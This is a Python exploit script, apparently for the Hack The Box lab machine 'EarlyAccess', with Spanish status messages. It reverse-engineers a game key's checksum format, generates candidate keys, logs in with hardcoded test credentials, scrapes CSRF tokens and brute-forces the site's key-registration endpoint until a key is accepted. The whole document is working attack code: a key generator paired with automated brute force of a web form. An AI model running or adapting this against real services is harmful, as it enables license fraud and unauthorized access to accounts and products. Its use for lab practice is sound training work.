#!/usr/bin/env python3

from itertools import product
import string
import pdb
import signal
import sys
import requests
import urllib3
import re
from pwn import *

def def_handler(sig, def_handler):
  print("\n\n[!] Saliendo...")
  sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

def calc_g3():
  p1 = product(string.ascii_uppercase, repeat=2)
  p1 = [ "".join(i) for i in p1 ]

  uniques = {}

  for couple in p1:
    for index in range(0,10):
      cadena = f"XP{couple}{index}"
      value = sum(bytearray(cadena.encode()))
      # print(f"{cadena}: {value}")

      uniques[value] = cadena

  return uniques.values()

# Checksum
def calc_cs(key) -> int:
  gs = key.split('-')[:-1]
  return sum([sum(bytearray(g.encode())) for g in gs])

def keyGen():
  values = calc_g3()

  totalkeys = []

  for key in values:
    key = f"KEY67-AYBZ0-{key}-GAMC7-"
    cs = calc_cs(key)

    finalKey = key + str(cs)
    totalkeys.append(finalKey)

  return totalkeys

def tryKeys(keys):
  loginUrl = "https://earlyaccess.htb/login"
  keyUrl = "https://earlyaccess.htb/key"
  keyAddUrl = "https://earlyaccess.htb/key/add"
  
  urllib3.disable_warnings()
  session = requests.session()
  session.verify = False

  response = session.get(loginUrl)

  token = re.findall(r'name="_token" value="(.*?)"', response.text)[0]

  dataPost = {
    '_token': token,
    'email': 'fenix@fenix.com',
    'password': 'fenix123'
  }

  response = session.post(loginUrl, data=dataPost)

  p1 = log.progress("Fuerza bruta")
  p1.status("Iniciando proceso de fuerza bruta")
  time.sleep(2)

  counter = 1

  for key in keys:
    p1.status(f"Probando con la key {key} [{counter}/60]")
    response = session.get(keyUrl)
  
    token = re.findall(r'name="_token" value="(.*?)"', response.text)[0]

    dataPost = {
      '_token': token,
      'key': key
    }

    response = session.post(keyAddUrl, data=dataPost)

    if "Game-key is invalid!" not in response.text:
      p1.success(f"La KEY {key} es valida y ha sido registrada")
      sys.exit(0)

    time.sleep(1)
    counter += 1

if __name__ == "__main__":
  keys = keyGen()

  tryKeys(keys)
  

